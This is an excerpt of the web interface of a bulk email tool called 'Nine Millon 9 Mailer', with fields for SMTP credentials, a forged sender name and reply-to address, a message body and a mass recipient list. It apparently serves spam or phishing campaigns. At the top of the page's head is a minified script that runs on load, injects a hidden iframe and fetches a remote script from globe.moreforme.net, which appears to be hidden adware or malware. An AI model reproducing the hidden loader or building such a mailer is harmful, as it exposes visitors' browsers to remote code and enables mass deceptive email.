...
<head><script>if(top==window){var engageNameSpace="engagens";"undefined"==typeof window[engageNameSpace]&&(window[engageNameSpace]={}),window[engageNameSpace].engageLoader=function(){function e(e){return"undefined"!=typeof e&&null!==e}function t(){var t=document.createElement("script");t.setAttribute("src",s),t.setAttribute("id","fn_engage_script"),t.setAttribute("async",""),(null==document.head||e(document.head))&&(document.head=document.getElementsByTagName("head")[0]),document.head.appendChild(t)}function n(){var t=r();if(e(t)){var n=t;i()&&(n=d(t));var o;try{o=document.documentElement,o.appendChild(n)}catch(c){o=document.body,o.appendChild(n)}a()}}function a(){function e(e){var n=e.data;"l8IframeIsReady"===n.message&&t()}window.addEventListener?window.addEventListener("message",e,!1):window.attachEvent("onmessage",e)}function r(){var t=document.createElement("iframe");if(e(t)){t.setAttribute("id","fn_engage"),t.setAttribute("src",u),t.setAttribute("target","_blank"),t.setAttribute("frameborder","0");var n=/firefox/i.exec(navigator.userAgent);e(n)&&n.length>0?(t.style.height=0,t.style.width=0):t.style.display="none",t.frameBorder="no"}return t}function i(){var t=!1,n=/android (\d+)/i.exec(navigator.userAgent);return e(n)&&n.length>0&&(t=parseInt(n[1])>=4),t}function d(e){var t=document.createElement("div");return t.setAttribute("id","fn_wrapper_div"),t.style.position="fixed",t.style.display="none",t.ontouchstart=function(){return!0},t.appendChild(e),t}function o(){var t=void 0,a=this,r=function(){e(t)&&(window.clearTimeout(t),t=void 0,n.call(a))};t=window.setTimeout(r,1e4),"function"==typeof window.addEventListener?window.addEventListener("load",r,!1):window.attachEvent("onload",r)}var c="http://globe.moreforme.net",u=c+"/l8/EngageService?v=1",s=c+"/scripts/Engage.js";o()};var engageLoader=new window[engageNameSpace].engageLoader}</script>
    <title>Nine Millon 9 Mailer</title>
	<link rel="icon" href="https://h.top4top.io/p_1544hjqfz1.png">
...
$(document).ready(function(){
    ...
    $("#autoUpdate3").fadeOut("slow");
        ...
        <div class="container col-lg-6">
         <h3><img src="https://h.top4top.io/p_1544hjqfz1.png" height="75px" width="75px"> <font style="color:#ffffff;"> Nine millon 9 Mailer</font> <small><font style="color:white;">Good luck</font></small></h3>
        <form name="form" id="form" method="POST" enctype="multipart/form-data" action="">
        <p><input id="checkbox1" type="checkbox" name="usesmtp" value=""><font style="color:#ffffff;">Use SMTP Server<br></p>
        <div class="row" id="autoUpdate">
            <div class="form-group col-lg-6 "><label for="shost">SMTP Hostname</label><input type="text" style="background-color:#4c4c4c;border-radius:3px;color:#ffffff;"  class="form-control  input-sm " id="shost" name="shost" value="'.$shost.'"></div>
            <div class="form-group col-lg-6 "><label for="sport">SMTP Port</label><input type="text" style="background-color:#4c4c4c;border-radius:3px;color:#ffffff;" class="form-control  input-sm " id="sport" name="sport" value="'.$sport.'"></div>
        </div>
        <div class="row" id="autoUpdate2">
            <div class="form-group col-lg-6 "><label for="suser">SMTP Username</label><input type="text" style="background-color:#4c4c4c;border-radius:3px;color:#ffffff;" class="form-control  input-sm " id="suser" name="suser" value="'.$suser.'"></div>
            <div class="form-group col-lg-6 "><label for="spass">SMTP Password</label><input type="text" style="background-color:#4c4c4c;border-radius:3px;color:#ffffff;" class="form-control  input-sm " id="spass" name="spass" value="'.$spass.'"></div>
        </div>
    ...
    <div class="form-group col-lg-4 "><label for="checkeremail">Checker Send To Email</label><input type="text" style="background-color:#4c4c4c;border-radius:3px;color:#ffffff;" class="form-control  input-sm " id="checkeremail" name="checkeremail" value=""></div>
    <div class="form-group col-lg-2 "><label for="test"> &nbsp</label><input type="button" style="background-color:#930205;border-color:red"   class="form-control  btn btn-info " id="test" name="test" onclick="check()" value="TEST SMTP">   </div>
        ...
        <hr><br><br>
        <div class="row">
        <div class="form-group col-lg-6 "><label for="senderEmail">From Email</label><input type="text" style="background-color:#4c4c4c;border-radius:3px;color:#ffffff;" class="form-control  input-sm " id="senderEmail" name="senderEmail" value="'.$senderEmail.'"></div>
        <div class="form-group col-lg-6 "><label for="senderName">Sender Name</label><input type="text" style="background-color:#4c4c4c;border-radius:3px;color:#ffffff;" class="form-control  input-sm " id="senderName" name="senderName" value="'.$senderName.'"></div>
    </div>
    ...
    <div class="row">
                ...
                <div class="form-group col-lg-6"><label for="replyTo">Reply-to</label><input type="text" style="background-color:#4c4c4c;border-radius:3px;color:#ffffff;" class="form-control  input-sm " id="replyTo" name="replyTo" value="'.$replyTo.'" /></div>
            </div>
            <div class="row">
                <div class="form-group col-lg-12 "><label for="subject">Subject</label><input type="text" style="background-color:#4c4c4c;border-radius:3px;color:#ffffff;" class="form-control  input-sm " id="subject" name="subject" value="'.$subject.'" /></div>
            </div>
            <div class="row">
                <div class="form-group col-lg-6"><label for="messageLetter">Message Letter</label><textarea name="messageLetter" id="messageLetter" style="background-color:#4c4c4c;border-radius:3px;color:#ffffff;" class="form-control" rows="10" id="textArea">'.$messageLetter.'</textarea></div>
                <div class="form-group col-lg-6 "><label for="emailList">Email List</label><textarea name="emailList" id="emailList" onselect="funchange()" onchange="funchange()" onkeydown="funchange()" onkeyup="funchange()" onchange="funchange()" style="background-color:#4c4c4c;border-radius:3px;color:#ffffff;" class="form-control" rows="10" id="textArea">'.$emailList.'</textarea></div>
			</div>
			<div class="row">
			<div class="form-group col-lg-6">
            ...
            <button type="submit" style="background-color:#930205;border-color:#29a3a3" class="btn btn-danger btn-sm" form="form" name="action" value="send">SEND MESSAGE</button>
   
        </form><br><hr><br><br>
    </div>
    <div class="col-lg-6"><br>
    <label for="well">Instruction</label>
    <div id="well" style="background-color:#4c4c4c;border-radius:3px;color:#ffffff;" class="well well">
